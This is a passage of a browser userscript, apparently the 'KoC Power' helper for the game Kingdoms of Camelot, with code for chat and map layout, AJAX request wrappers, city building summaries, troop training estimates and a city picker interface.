	  if (Options.pdxBackgroundStyle=="pdxBackground1" || Options.pdxBackgroundStyle=="pdxBackground2" || Options.pdxBackgroundStyle=="pdxBackground3" ||  Options.pdxBackgroundStyle=="pdxBackground4" ||  Options.pdxBackgroundStyle=="pdxBackground5" ||	Options.pdxBackgroundStyle=="pdxBackground6" || Options.pdxBackgroundStyle=="pdxBackground7" || Options.pdxBackgroundStyle=="pdxBackground8" || Options.pdxBackgroundStyle=="pdxBackground9" ||  Options.pdxBackgroundStyle=="pdxBackground10" || Options.pdxBackgroundStyle=="pdxBackground12" ||  Options.pdxBackgroundStyle=="pdxBackground13" ||  Options.pdxBackgroundStyle=="pdxBackground14" ||  Options.pdxBackgroundStyle=="pdxBackground15" || Options.pdxBackgroundStyle=="pdxBackground16" ||  Options.pdxBackgroundStyle=="pdxBackground17" ||  Options.pdxBackgroundStyle=="pdxBackground18" ||  Options.pdxBackgroundStyle=="pdxBackground19" ||  Options.pdxBackgroundStyle=="pdxBackground20" ||	Options.pdxBackgroundStyle=="pdxBackground21" || Options.pdxBackgroundStyle=="pdxBackground22" ||  Options.pdxBackgroundStyle=="pdxBackground23" ||  Options.pdxBackgroundStyle=="pdxBackground24" ||  Options.pdxBackgroundStyle=="pdxBackground25" || Options.pdxBackgroundStyle=="pdxBackground26" ||  Options.pdxBackgroundStyle=="pdxBackground27" ||  Options.pdxBackgroundStyle=="pdxBackground28" ||  Options.pdxBackgroundStyle=="pdxBackground29" ||  Options.pdxBackgroundStyle=="pdxBackground30" || Options.pdxBackgroundStyle=="pdxBackground31" ||  Options.pdxBackgroundStyle=="pdxBackground32" ||  Options.pdxBackgroundStyle=="pdxBackground33" ||  Options.pdxBackgroundStyle=="pdxBackground34" ||  Options.pdxBackgroundStyle=="pdxBackground35" || Options.pdxBackgroundStyle=="pdxBackground36" ||  Options.pdxBackgroundStyle=="pdxBackground37" ||  Options.pdxBackgroundStyle=="pdxBackground38" ||  Options.pdxBackgroundStyle=="pdxBackground39" || Options.pdxBackgroundStyle=="pdxBackground40" || Options.pdxBackgroundStyle=="pdxBackground41" ||  Options.pdxBackgroundStyle=="pdxBackground42" ||  Options.pdxBackgroundStyle=="pdxBackground43" ||  Options.pdxBackgroundStyle=="pdxBackground44" ||  Options.pdxBackgroundStyle=="pdxBackground45" || Options.pdxBackgroundStyle=="pdxBackground46" ||  Options.pdxBackgroundStyle=="pdxBackground47" ||  Options.pdxBackgroundStyle=="pdxBackground48" ||  Options.pdxBackgroundStyle=="pdxBackground49" || Options.pdxBackgroundStyle=="pdxBackground50" || Options.pdxBackgroundStyle=="pdxBackground51" ||  Options.pdxBackgroundStyle=="pdxBackground52" ||  Options.pdxBackgroundStyle=="pdxBackground53" ||  Options.pdxBackgroundStyle=="pdxBackground54" ||  Options.pdxBackgroundStyle=="pdxBackground55" || Options.pdxBackgroundStyle=="pdxBackground56" ||  Options.pdxBackgroundStyle=="pdxBackground57" ||  Options.pdxBackgroundStyle=="pdxBackground58" ||  Options.pdxBackgroundStyle=="pdxBackground59" || Options.pdxBackgroundStyle=="pdxBackground60" || Options.pdxBackgroundStyle=="pdxBackground61" || Options.pdxBackgroundStyle=="pdxBackground62" || Options.pdxBackgroundStyle=="pdxBackground63" ||  Options.pdxBackgroundStyle=="pdxBackground64" ||
	  Options.pdxBackgroundStyle=="pdxKoCOld"  || Options.pdxBackgroundStyle=="pdxBackground11" || Options.pdxBackgroundStyle=="pdxBackgroundColordark" || Options.pdxBackgroundStyle=="pdxBackgroundColor" || Options.pdxBackgroundStyle=="pdxOwnBackground" || Options.pdxBackgroundStyle=="pdxOwnBackgrounddark" || Options.pdxBackgroundStyle=="pdxBackground11" && Options.pbChatOnRight==true) {
	  chat.style.top = '-555px';
	  chat.style.left = '755px';

	  document.getElementById('mod_comm_list1').style.height = '800px';
      document.getElementById('mod_comm_list2').style.height = '800px';	  
	  document.getElementById('mod_comm_list1').style.width = Options.chatWidth+'px';
      document.getElementById('mod_comm_list2').style.width = Options.chatWidth+'px';
	  }
	  if (Options.pbChatOnRight==true && Options.pdxBackgroundStyle=="pdxBackground11" && Options.hideShowKoCBottomStuff==true) {
	  chat.style.top = Options.chatTop;
	  chat.style.left = Options.chatLeft;

	  document.getElementById('mod_comm_list1').style.height = '505px';
      document.getElementById('mod_comm_list2').style.height = '505px';
	  	  document.getElementById('mod_comm_list1').style.width = Options.chatWidth+'px';
      document.getElementById('mod_comm_list2').style.width = Options.chatWidth+'px';
	  }
 } else {
      var chat = document.getElementById('kocmain_bottom').childNodes[1];
      chat.style.top = '0px';
      chat.style.left = '0px';
      chat.style.height = '';
      chat.style.background = '';
      document.getElementById('mod_comm_list1').style.height = '287px';
      document.getElementById('mod_comm_list2').style.height = '287px';
	  document.getElementById('mod_comm_list1').style.width = '290px';
      document.getElementById('mod_comm_list2').style.width = '290px';
    }
    t.chatIsRight = tf;
  },

  useWideMap : function (tf) {
    t = WideScreen;
    if (tf == t.useWideMap || !GlobalOptions.pbWideScreen)
      return;
    if (tf){
      t.rail.style.display = 'none';
      document.getElementById('mapwindow').style.height = "436px";
      document.getElementById('mapwindow').style.width = Options.widewidth;
      document.getElementById('mapwindow').style.zIndex = "50";
    } else {
      t.rail.style.display = 'block';
      document.getElementById('mapwindow').style.height = "439px";
      document.getElementById('mapwindow').style.width = "760px";
      document.getElementById('mapwindow').style.zIndex = "";
    }
  },
}
/************************************************************************************
*						KOC POWER - tabManager										*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'PLUGIN_TABMANAGER' ));

function AjaxRequest2 (url, opts){
    var headers = { 'X-Requested-With': 'XMLHttpRequest',        'X-Prototype-Version': '1.6.1',        'Accept': 'text/javascript, text/html, application/xml, text/xml, */*'    };
    var ajax = null;   
    if (window.XMLHttpRequest)
      ajax=new XMLHttpRequest();
    else
      ajax=new ActiveXObject("Microsoft.XMLHTTP");   
    if (opts.method==null || opts.method=='')
      method = 'GET';
    else
      method = opts.method.toUpperCase();    
    if (method == 'POST'){  headers['Content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8';  } else if (method == 'GET'){        addUrlArgs (url, opts.parameters);    }    
    ajax.onreadystatechange = function(){ // ['Uninitialized', 'Loading', 'Loaded', 'Interactive', 'Complete']; states 0-4
        if (ajax.readyState==4) {
            if (ajax.status >= 200 && ajax.status < 305)
            if (opts.onSuccess) opts.onSuccess(ajax);
            else
                if (opts.onFailure) opts.onFailure(ajax);
            } else { if (opts.onChange) opts.onChange (ajax); }
    }    
    ajax.open(method, url, true); // always async!
    for (var k in headers)
      ajax.setRequestHeader (k, headers[k]);
     if (matTypeof(opts.requestHeaders)=='object')
          for (var k in opts.requestHeaders)
            ajax.setRequestHeader (k, opts.requestHeaders[k]);
    if (method == 'POST'){
        var a = [];
        for (k in opts.parameters){
              if(matTypeof(opts.parameters[k]) == 'object'){
                  for(var h in opts.parameters[k]){
                      if(matTypeof(opts.parameters[k][h]) == 'object'){
                          for(var i in opts.parameters[k][h]){
                              if(matTypeof(opts.parameters[k][h][i]) == 'object'){
                              for(var j in opts.parameters[k][h][i]){
                                  a.push (k+'['+h+']['+i+']['+j+'] ='+ opts.parameters[k][h][i][j] );
                              }
                              } else
                              	a.push (k+'['+h+']['+i+']'+' ='+ opts.parameters[k][h][i]);
                          }
                      } else
                      a.push (k+'['+h+'] ='+ opts.parameters[k][h] );
                  }
              } else
              a.push (k +'='+ opts.parameters[k] );
        }
        ajax.send (a.join ('&'));
    } else {
        ajax.send();
    }
}
function onUnload (){
  Options.pbWinPos = mainPop.getLocation();
  if (!ResetAll) saveOptions();
  if (!ResetColors) saveColors();
  if (!ResetStyleOptions) saveStyleOptions();
}
function mouseMainTab (me){   if (me.button == 2){    var c = getClientCoords (document.getElementById('main_engagement_tabs'));    mainPop.setLocation ({x: c.x+4, y: c.y+c.height});  } }
function eventHideShow (){  if (mainPop.toggleHide(mainPop)){    tabManager.showTab();    Options.pbWinIsOpen = true;  } else {    tabManager.hideTab();    Options.pbWinIsOpen = false;  }  saveOptions();}
function hideMe (){  mainPop.show (false);  tabManager.hideTab();  Options.pbWinIsOpen = false;  saveOptions();}
function showMe (){  mainPop.show (true);  tabManager.showTab();  Options.pbWinIsOpen = true;  saveOptions();}
function addMyFunction (func){ unsafeWindow[func.name] = func;}
function addUwFunction (func){ var scr = document.createElement('script');  scr.innerHTML = func.toString();  document.body.appendChild(scr);}
function alterUwFunction (funcName, frArray){
  try {
    funcText = unsafeWindow[funcName].toString();
    rt = funcText.replace ('function '+funcName, 'function');
    for (i=0; i<frArray.length; i++){
      x = rt.replace(frArray[i][0], frArray[i][1]);
      if (x == rt)
        return false;
      rt = x;
    }
    js = funcName +' = '+ rt;
    var scr=document.createElement('script');
    scr.innerHTML=js;
    document.body.appendChild(scr);
    return true;
  } catch (err) {  return false;  }
}
function officerId2String (oid){
  if (oid==null)
    return '';
  else if (oid==3) 	
    return uW.allianceOfficerTypeMapping[3];
  else if (oid==2)
    return uW.allianceOfficerTypeMapping[2];
  else if (oid==1)
    return uW.allianceOfficerTypeMapping[1];
    else if (oid==4)
    return uW.allianceOfficerTypeMapping[4];
  return '';
}
/************************************************************************************
*						KOC POWER - ALLIANCE COUNTDOWN								*
************************************************************************************/
if(!false) eval(GM_getResourceText( 'PLUGIN_ALLIANCECOUNT' ));

function AjaxRequest (url, opts){
  var headers = { 'X-Requested-With': 'XMLHttpRequest', 'X-Prototype-Version': '1.6.1', 'Accept': 'text/javascript, text/html, application/xml, text/xml, */*' };
  var ajax = null;

if (DEBUG_TRACE_AJAX) logit ("AJAX: "+ url +"\n" + inspect (opts, 3, 1));

  if (window.XMLHttpRequest)
    ajax=new XMLHttpRequest();
  else
    ajax=new ActiveXObject("Microsoft.XMLHTTP");

  if (opts.method==null || opts.method=='')
    method = 'GET';
  else
    method = opts.method.toUpperCase();

  if (method == 'POST'){ headers['Content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'; } else if (method == 'GET'){ addUrlArgs (url, opts.parameters); }

  ajax.onreadystatechange = function(){ //  ['Uninitialized', 'Loading', 'Loaded', 'Interactive', 'Complete']; states 0-4
    if (ajax.readyState==4) {
      if (ajax.status >= 200 && ajax.status < 305)
        if (opts.onSuccess) opts.onSuccess(ajax);
      else
        if (opts.onFailure) opts.onFailure(ajax);
    } else { if (opts.onChange) opts.onChange (ajax);    }
  }

  ajax.open(method, url, true);   // always async!

  for (var k in headers)
    ajax.setRequestHeader (k, headers[k]);
  if (matTypeof(opts.requestHeaders)=='object')
    for (var k in opts.requestHeaders)
      ajax.setRequestHeader (k, opts.requestHeaders[k]);

  if (method == 'POST'){
    var a = [];
    for (k in opts.parameters)
      a.push (k +'='+ opts.parameters[k] ); 
	  ajax.send (a.join ('&')); 
	  } else { ajax.send(); }
}

function MyAjaxRequest (url, o, noRetry){
if (DEBUG_TRACE) logit (" 0 myAjaxRequest: "+ url +"\n" + inspect (o, 2, 1));
  var opts = unsafeWindow.Object.clone(o);
  var wasSuccess = o.onSuccess;
  var wasFailure = o.onFailure;
  var retry = 0;
  var delay = 5;
  var noRetry = noRetry===true?true:false;
  opts.onSuccess = mySuccess;
  opts.onFailure = myFailure;

if (DEBUG_TRACE) logit (" 1a myAjaxRequest: "+ url +"\n" + inspect (o, 2, 1));
  new AjaxRequest(url, opts);
  return;

  function myRetry(){   ++retry;    new AjaxRequest(url, opts);    delay = delay * 1.25;  }
  function myFailure(){  var o = {};
if (DEBUG_TRACE) logit ("myAjaxRequest.myFailure(): "+ inspect(rslt, 1, 1));
    o.ok = false;
    o.errorMsg = "AJAX Communication Failure";
    wasFailure (o);
  }

  function mySuccess (msg){
    var rslt = eval("(" + msg.responseText + ")");
    var x;
    if (rslt.ok){
if (DEBUG_TRACE) logit (" 1b myAjaxRequest.mySuccess(): "+ inspect(rslt, 1, 1));
      rslt.errorMsg = null;   ///// !!!!!!!!!!!!!  ************
      if (rslt.updateSeed)
        unsafeWindow.update_seed(rslt.updateSeed);
      wasSuccess (rslt);
      return;
    }
if (DEBUG_TRACE) logit (" 1b myAjaxRequest.mySuccess() !ok : "+ inspect(rslt, 3, 1));
    rslt.errorMsg = unsafeWindow.printLocalError((rslt.error_code || null), (rslt.msg || null), (rslt.feedback || null));
    if ( (x = rslt.errorMsg.indexOf ('<br><br>')) > 0)
      rslt.errorMsg = rslt.errorMsg.substr (0, x-1);
    if (!noRetry && (rslt.error_code==0 ||rslt.error_code==8 || rslt.error_code==1 || rslt.error_code==3)){
	  dialogRetry (rslt.errorMsg, delay, function(){myRetry()}, function(){wasSuccess (rslt)}, rslt.error_code);
    } else {
      wasSuccess (rslt);
    }
  }
}



function getMyUserId (){return parseInt([Seed.tutorial.userId]);}
function getMyAlliance (){
  if (Seed.allianceDiplomacies==null || Seed.allianceDiplomacies.allianceName==null)
    return [0, ''+culang.none+''];
  else
    return [Seed.allianceDiplomacies.allianceId, Seed.allianceDiplomacies.allianceName];
}
function UniteKMG(nb) {
          if (Math.abs(nb)>1000000000)
    	    val="<span title='"+addCommas(nb)+"'>" + (nb/1000000000).toFixed(2) +" "+culang.shrbil+"</span>";
    	  else if (Math.abs(nb)>1000000)                               
    	   val="<span title='"+addCommas(nb)+"'>" + (nb/1000000).toFixed(2) +" "+culang.shrmil+"</span>";
     	  else if (nb==0)
    	   val="0";
    	  else
	   val=addCommas(nb);
    
     return val;
}
function getDiplomacy (aid) {
	  if(aid < 1 || aid == null)
		return ''+culang.noally+'';
	  if (Seed.allianceDiplomacies == null)
		return ''+culang.neutral+'';
	  if (Seed.allianceDiplomacies.friendly && Seed.allianceDiplomacies.friendly['a'+aid] != null)
		return ''+culang.friendly+'';
	  if (Seed.allianceDiplomacies.hostile && Seed.allianceDiplomacies.hostile['a'+aid] != null)
		return ''+culang.hostile+'';
	  if(getMyAlliance()[0] == aid)
		return ''+culang.ally+'';
	  return ''+culang.neutral+'';
	};

function getCityBuilding (cityId, buildingId){
  var b = Seed.buildings['city'+cityId];
  var ret = {count:0, maxLevel:0};
  for (var i=1; i<33; i++){
    if (b['pos'+i] && b['pos'+i][0] == buildingId){
      ++ret.count;
      if (parseInt(b['pos'+i][1]) > ret.maxLevel)
        ret.maxLevel = parseInt(b['pos'+i][1]);
    }
  }
  return ret;
}

function highlightLowBuilding (noBuildings, buildingLevel, buildingPrefix){
  var ret = '';
  if (buildingLevel<9)
    ret += '<SPAN class=boldRed>';
  if (noBuildings>1)
    ret += noBuildings + ' x ';
  if (buildingPrefix)
    ret += buildingPrefix;
  ret += ''+culang.lvl+' ' + buildingLevel;
  if (buildingLevel<9)
    ret += '</SPAN>';
  return ret;
}
function getAllCityBuildings (cityID){
  var b = Seed.buildings[cityID];
  var castleLevel = parseInt(b['pos0'][1]);
  var noFields = 10 + 3 * castleLevel;
  if (castleLevel==11)
    noFields = 40;
  sumCastle = highlightLowBuilding(1,castleLevel);  sumCottage = '';  sumTavern = '';  sumKnightsHall = '';  sumEmbassy = '';  sumStorehouse = '';  sumMarket = '';  sumAlchemyLab = '';  sumRallyPoint = '';  sumBarracks = '';  sumWatchTower = '';  sumBlacksmith = '';  sumWorkshop = '';  sumStable = '';  sumReliefStation = '';  sumWall = '';  sumGuardian = '';  sumInside = 0;  sumFarm = '';  sumSawmill = '';  sumQuarry = '';  sumMine = '';  sumOutside = 0;  arrCottage = [];  arrBarracks = [];  arrFarm = [];  arrSawmill = [];  arrQuarry = [];  arrMine = [];
  for (var i=1; i<12; i++){ arrCottage[i]=0;    arrBarracks[i]=0;    arrFarm[i]=0;    arrSawmill[i]=0;    arrQuarry[i]=0;    arrMine[i]=0;  }

  for (var i=1; i<33; i++){
    if (b['pos'+i]) {
      bname = b['pos'+i][0];
      blvl  = b['pos'+i][1];
      if (bname==5)  arrCottage[blvl]++;
      if (bname==6)  sumTavern        = highlightLowBuilding(1,blvl);
      if (bname==7)  sumKnightsHall   = highlightLowBuilding(1,blvl);
      if (bname==8)  sumEmbassy       = highlightLowBuilding(1,blvl);
      if (bname==9)  sumStorehouse    = highlightLowBuilding(1,blvl);
      if (bname==10) sumMarket        = highlightLowBuilding(1,blvl);
      if (bname==11) sumAlchemyLab    = highlightLowBuilding(1,blvl);
      if (bname==12) sumRallyPoint    = highlightLowBuilding(1,blvl);
      if (bname==13) arrBarracks[blvl]++;
      if (bname==14) sumWatchTower    = highlightLowBuilding(1,blvl);
      if (bname==15) sumBlacksmith    = highlightLowBuilding(1,blvl);
      if (bname==16) sumWorkshop      = highlightLowBuilding(1,blvl);
      if (bname==17) sumStable        = highlightLowBuilding(1,blvl);
      if (bname==18) sumReliefStation = highlightLowBuilding(1,blvl);
      if (bname==19) sumWall          = highlightLowBuilding(1,blvl);
    }
    else
      sumInside += 1;
  }
  for (var i=100; i<100+noFields; i++){
    if (b['pos'+i]) {
      bname = b['pos'+i][0];
      blvl  = b['pos'+i][1];
      if (bname==1) arrFarm[blvl]++;
      if (bname==2) arrSawmill[blvl]++;
      if (bname==3) arrQuarry[blvl]++;
      if (bname==4) arrMine[blvl]++;
    }
    else
      sumOutside += 1;
  }
  for (var i=1; i<12; i++){
    if(arrCottage[i]>0)  sumCottage+=highlightLowBuilding(arrCottage[i],i)+'<BR>';
    if(arrBarracks[i]>0) sumBarracks+=highlightLowBuilding(arrBarracks[i],i)+'<BR>';
    if(arrFarm[i]>0)     sumFarm+=highlightLowBuilding(arrFarm[i],i)+'<BR>';
    if(arrSawmill[i]>0)  sumSawmill+=highlightLowBuilding(arrSawmill[i],i)+'<BR>';
    if(arrQuarry[i]>0)   sumQuarry+=highlightLowBuilding(arrQuarry[i],i)+'<BR>';
    if(arrMine[i]>0)     sumMine+=highlightLowBuilding(arrMine[i],i)+'<BR>';
  }
  if (sumCottage.length>0)  sumCottage=sumCottage.substring (0,sumCottage.length-4);
  if (sumBarracks.length>0) sumBarracks=sumBarracks.substring (0,sumBarracks.length-4);
  if (sumFarm.length>0)     sumFarm=sumFarm.substring (0,sumFarm.length-4);
  if (sumSawmill.length>0)  sumSawmill=sumSawmill.substring (0,sumSawmill.length-4);
  if (sumQuarry.length>0)   sumQuarry=sumQuarry.substring (0,sumQuarry.length-4);
  if (sumMine.length>0)     sumMine=sumMine.substring (0,sumMine.length-4);
  if (b['pos500']) {
    blvl  = b['pos500'][1];
    bname = unsafeWindow.buildingcost['bdg' + b['pos500'][0]][0];
    bname = bname.substr(0,bname.length-8);
    sumGuardian = highlightLowBuilding(1,blvl,bname);
  }
  else
    sumInside += 1;
  if (sumInside==0)
    sumInside='<span class=boldGreen>'+culang.builddone+'</span>';
  else
    sumInside='<SPAN class=boldRed>'+culang.free+': '+sumInside+'</SPAN>';
  if (sumOutside==0)
    sumOutside='<span class=boldGreen>'+culang.builddone+'</span>';
  else
    sumOutside='<SPAN class=boldRed>'+culang.free+': '+sumOutside+'</SPAN>';
}

function getTroopTrainEstimates (cityID){
  var b = Seed.buildings[cityID];
  numBarracks = 0;
  maxBarracks = 0;
  totLevelsBarracks = 0;
  blacksmithLevel = 0;
  stableLevel = 0;
  workshopLevel = 0;
  for (var j=1; j<33; j++){
    if (b['pos'+j]) {
      var bname = parseInt(b['pos'+j][0]);
      var blvl = parseInt(b['pos'+j][1]);
      if (bname==13) {
        numBarracks++;
        totLevelsBarracks += parseInt(blvl);
        if (blvl>maxBarracks) maxBarracks=blvl;
      }
      if (bname==15)
        blacksmithLevel = blvl;
      if (bname==17)
        stableLevel = blvl;
      if (bname==16)
        workshopLevel = blvl;
    }
  }

  var now = unixTime();
  marshallCombatScore = 0;
  var s = Seed.knights[cityID];
  if (s) {
    s = s["knt" + Seed.leaders[cityID].combatKnightId];
    if (s){
      marshallCombatScore = s.combat;
      if (s.combatBoostExpireUnixtime > now)
        marshallCombatScore *= 1.25;
    }
  }

  geometryLevel            = parseInt(Seed.tech["tch5"]);
  eagleEyesLevel           = parseInt(Seed.tech["tch6"]);
  poisonedEdgeLevel        = parseInt(Seed.tech["tch8"]);
  metalAlloysLevel         = parseInt(Seed.tech["tch9"]);
  featherweightPowderLevel = parseInt(Seed.tech["tch10"]);
  alloyHorseshoesLevel     = parseInt(Seed.tech["tch12"]);
  fletchingLevel           = parseInt(Seed.tech["tch13"]);

  var bm = numBarracks + 0.1 * (totLevelsBarracks - numBarracks);
  var mf = marshallCombatScore / 200;
  var gf = geometryLevel/10;
  var sf = stableLevel/10;
  var wf = workshopLevel/10;
  var isf = bm * (1 + mf + gf);
  var csf = bm * (1 + mf + gf + sf);
  var ssf = bm * (1 + mf + gf + sf + wf);

  if (maxBarracks > 0) {
    rateSupplyTroop = 3600 * isf /   50;
    rateMilitiaman  = 3600 * isf /   25;
  } else {
    rateSupplyTroop = 0;
    rateMilitiaman  = 0;
  }
  if (maxBarracks > 1 && eagleEyesLevel > 0)
    rateScout = 3600 * isf /  100;
  else
    rateScout = 0;
  if (maxBarracks > 1 && poisonedEdgeLevel > 0)
    ratePikeman = 3600 * isf /  150;
  else
    ratePikeman = 0;
  if (maxBarracks > 2 && blacksmithLevel > 0 && metalAlloysLevel > 0)
    rateSwordsman = 3600 * isf /  225;
  else
    rateSwordsman = 0;
  if (maxBarracks > 3 && fletchingLevel > 0)
    rateArcher = 3600 * isf /  350;
  else
    rateArcher = 0;
  if (maxBarracks > 4 && stableLevel > 0 && alloyHorseshoesLevel > 0)
    rateCavalry = 3600 * csf /  500;
  else
    rateCavalry = 0;
  if (maxBarracks > 6 && blacksmithLevel > 4 && stableLevel > 4 && alloyHorseshoesLevel > 4)
    rateHeavyCavalry = 3600 * csf / 1500;
  else
    rateHeavyCavalry = 0;
  if (maxBarracks > 5 && stableLevel > 0 && workshopLevel > 2 && featherweightPowderLevel > 0)
    rateSupplyWagon  = 3600 * ssf / 1000;
  else
    rateSupplyWagon = 0;
  if (maxBarracks > 7 && stableLevel > 1 && workshopLevel > 4 && geometryLevel > 4 && fletchingLevel > 5)
    rateBallista = 3600 * ssf / 3000;
  else
    rateBallista = 0;
  if (maxBarracks > 8 && blacksmithLevel > 4 && stableLevel > 2 && workshopLevel > 6 && metalAlloysLevel > 7 && geometryLevel > 6)
    rateBatteringRam = 3600 * ssf / 4500;
  else
    rateBatteringRam = 0;
  if (maxBarracks > 9 && stableLevel > 1 && workshopLevel > 8 && geometryLevel > 9 && fletchingLevel > 9)
    rateCatapult = 3600 * ssf / 6000;
  else
    rateCatapult = 0;

}
function formatUnixTime (unixTimeString,format){
	var rtn = unsafeWindow.formatDateByUnixTime (unixTimeString);
/*if (format=='24hour') {
		if (rtn.substr(14,2)=='AM')
			rtn = rtn.substr(0,13);
		else
			rtn = rtn.substr(8,2)+' '+rtn.substr(0,8)+(parseInt(rtn.substr(8,2))+12)+rtn.substr(10,3);
	} */
	return rtn;
}
function getAllianceLeaders (){
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/allianceGetLeaders.php" + unsafeWindow.g_ajaxsuffix, {
		 method: "post",
		 parameters: params,
		 loading: true,
		 onSuccess: function (rslt) {
		 rslt = eval("(" + rslt.responseText + ")");
		 if (rslt.officers) {
			 Options.AllianceLeaders = [];
       for (add in rslt.officers) {
          Options.AllianceLeaders.push(rslt.officers[add]['userId']);
       }
     } 
     else {
			  setTimeout(function(){getAllianceLeaders;}, 1500);
		  }
		},
		onFailure: function () {}
  		});
};
function CdispCityPicker (id, span, dispName, notify, selbut){
  function CcityButHandler (t){
    var that = t;
    this.clickedCityBut = clickedCityBut;
    function clickedCityBut (e){
      if (that.selected != null)
        that.selected.className = "castleBut castleButNon";
      that.city = Cities.cities[e.target.id.substr(that.prefixLen)];
      if (that.dispName)
        document.getElementById(that.id+'cname').innerHTML = that.city.name;
      e.target.className = "castleBut castleButSel";
      that.selected = e.target;
      if (that.coordBoxX){
        that.coordBoxX.value = that.city.x;
        that.coordBoxY.value = that.city.y;
        var evt = document.createEvent("HTMLEvents");
        evt.initEvent('change', true, true ); // event type,bubbling,cancelable
        that.coordBoxX.dispatchEvent(evt);
        that.coordBoxY.dispatchEvent(evt);
        that.coordBoxX.style.backgroundColor = '#ffffff';
        that.coordBoxY.style.backgroundColor = '#ffffff';
      }
      if (that.notify != null)
        that.notify(that.city, that.city.x, that.city.y);
    }
  }
  function selectBut (idx){  document.getElementById(this.id+'_'+idx).click();  }
  function bindToXYboxes (eX, eY){
    function CboxHandler (t){
      var that = t;
      this.eventChange = eventChange;
      if (that.city){
        eX.value = that.city.x;
        eY.value = that.city.y;
      }
      function eventChange (){
      var xValue=that.coordBoxX.value.trim();
      var xI=/^\s*([0-9]+)[\s,]+([0-9]+)/.exec(xValue);
      if(xI) {
        that.coordBoxX.value=xI[1]
        that.coordBoxY.value=xI[2]
      }
        var x = parseInt(that.coordBoxX.value, 10);
        var y = parseInt(that.coordBoxY.value, 10);
        if (isNaN(x) || x<0 || x>750){
          that.coordBoxX.style.backgroundColor = '#ff8888';
          return;
        }
        if (isNaN(y) || y<0 || y>750){
          that.coordBoxY.style.backgroundColor = '#ff8888';
          return;
        }
        that.coordBoxX.style.backgroundColor = '#ffffff';
        that.coordBoxY.style.backgroundColor = '#ffffff';
        if (that.notify != null)
          that.notify (null, x, y);
      }
      return false;
    }
    this.coordBoxX = eX;
    this.coordBoxY = eY;
    var bh = new CboxHandler(this);
    eX.size=2;
    eX.maxLength=10;
    eY.size=2;
    eY.maxLength=3;
    eX.style.width='2em';
    eY.style.width='2em';
    eX.addEventListener('change', bh.eventChange, false);
    eY.addEventListener('change', bh.eventChange, false);
  }

  this.selectBut = selectBut;
  this.bindToXYboxes = bindToXYboxes;
  this.coordBoxX = null;
  this.coordBoxY = null;
  this.id = id;
  this.dispName = dispName;
  this.prefixLen = id.length+1;
  this.notify = notify;
  this.selected = null;
  this.city = null;
  var m = '';
  for (var i=0; i<Cities.cities.length; i++)
    m += '<INPUT class="castleBut castleButNon" id="'+ id +'_'+ i +'" value="'+ (i+1) +'" type=submit \>';
  if (dispName)
    m += ' &nbsp; <SPAN style="display:inline-block; width:85px; font-weight:bold;" id='+ id +'cname' +'></span>';
  span.innerHTML = m;
  var handler = new CcityButHandler(this);
  for (var i=0; i<Cities.cities.length; i++)
    document.getElementById (id+'_'+i).addEventListener('click', handler.clickedCityBut, false);
  if (selbut != null)
    this.selectBut(selbut);
};

function CdialogCancelContinue (msg, canNotify, contNotify, centerElement){
  var pop = new CPopup ('ptcancont', 0, 0, 746, 100, true, canNotify);
  if (centerElement)
    pop.centerMe(centerElement);
  else
    pop.centerMe(document.body);
  pop.getTopDiv().innerHTML = '<CENTER>KoC Power - Multilang </center>';
  pop.getMainDiv().innerHTML = '<TABLE class=pdxTab align=center style="height: 100%"><TR align=center height=90%><TD>'+ msg +'</td></tr>\
      <TR align=center><TD><INPUT id=ptcccancel type=submit value="'+culang.Hcancel+'" \> &nbsp; &nbsp; <INPUT id=ptcccontin type=submit value="CONTINUE" \></td></tr></table>';
  document.getElementById('ptcccancel').addEventListener ('click', function (){pop.show(false); if (canNotify) canNotify();}, false);
  document.getElementById('ptcccontin').addEventListener ('click', function (){pop.show(false); if (contNotify) contNotify();}, false);
  pop.show(true);
}
function getResearchLevels () {
	for (var t=1; t < 17; t++) {
		if (t != 7) {
			researchLevels[t] = {};
			researchLevels[t].Id = t;
			researchLevels[t].Name = unsafeWindow.techcost['tch'+t][0].replace (/&#39;/img, '\'');
			researchLevels[t].Level = parseInt(Seed.tech['tch'+t]);
			researchLevels[t].NextLevelETA = 0;
		}
	}
	var q;
	var now = unixTime();
	for(var i=0; i<Cities.numCities; i++) { // each city
		var cityID = 'city'+ Cities.cities[i].id;
		q = Seed.queue_tch[cityID];
		if (q[0] != undefined)
			researchLevels[parseInt(q[0][0])].NextLevelETA = parseInt(q[0][3]) - now;
	} //GM_log(inspect(researchLevels, 10, 1, false));
}
function getTroopDefTrainEstimates (cityID, city){
	var b = Seed.buildings[cityID];
	city.numCottages = 0;
	city.numBarracks = 0;
	city.maxBarracks = 0;
	city.totLevelsBarracks = 0;
	city.blacksmithLevel = 0;
	city.stableLevel = 0;
	city.workshopLevel = 0;
	city.wallLevel = 0;
	city.feyLevel = 0;
	for (var j=1; j<33; j++){
		if (b['pos'+j]) {
			var bname = parseInt(b['pos'+j][0]);
			var blvl = parseInt(b['pos'+j][1]);
			switch(bname){
				case 13:
					city.numBarracks++;
					city.totLevelsBarracks += parseInt(blvl);
					if (blvl>city.maxBarracks) city.maxBarracks=blvl;
					break;
				case 5:
					city.numCottages++;
					break;
				case 15:
					city.blacksmithLevel = blvl;
					break;
				case 16:
					city.workshopLevel = blvl;
					break;
				case 17:
					city.stableLevel = blvl;
					break;
				case 19:
					city.wallLevel = blvl;
					break;
				case 20:
				    city.feyLevel = blvl;
					break;
			}
		}
	}

	var now = unixTime();
	city.marshallCombatScore = 0;
	var s = Seed.knights[cityID];
	if (s) {
		s = s["knt" + Seed.leaders[cityID].combatKnightId];
		if (s){
			city.marshallCombatScore = s.combat;
			if (s.combatBoostExpireUnixtime > now)
				city.marshallCombatScore *= 1.25;
		}
	}
	city.foremanBasePoliticsScore = 0;
	var s = Seed.knights[cityID];
	if (s) {
		s = s["knt" + Seed.leaders[cityID].politicsKnightId];
		if (s){
			city.foremanBasePoliticsScore = s.politics;
			if (s.politicsBoostExpireUnixtime > now)
				city.foremanBasePoliticsScore *= 1.25;
		}
	}

	city.loggingLevel = parseInt(Seed.tech["tch2"]);
	city.geometryLevel = parseInt(Seed.tech["tch5"]);
	city.eagleEyesLevel = parseInt(Seed.tech["tch6"]);
	city.poisonedEdgeLevel = parseInt(Seed.tech["tch8"]);
	city.metalAlloysLevel = parseInt(Seed.tech["tch9"]);
